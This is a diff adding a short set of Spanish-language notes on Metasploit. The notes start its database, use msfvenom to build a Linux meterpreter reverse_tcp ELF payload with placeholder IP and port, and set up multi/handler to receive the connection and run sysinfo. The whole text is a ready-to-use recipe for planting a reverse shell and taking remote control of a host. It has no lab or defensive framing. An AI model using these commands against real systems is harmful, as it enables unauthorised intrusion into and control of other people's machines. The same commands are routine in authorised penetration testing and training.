@@ -1,0 +1,12 @@
+usamos metasploit
+  service postgresql start
+  msfdb init
+Creamos un payload con msfvenom:
+  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PUERTO -f elf > shell.elf
+  
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+Set LHOST ip 
+Set LPORT puerto
+run
+sysinfo
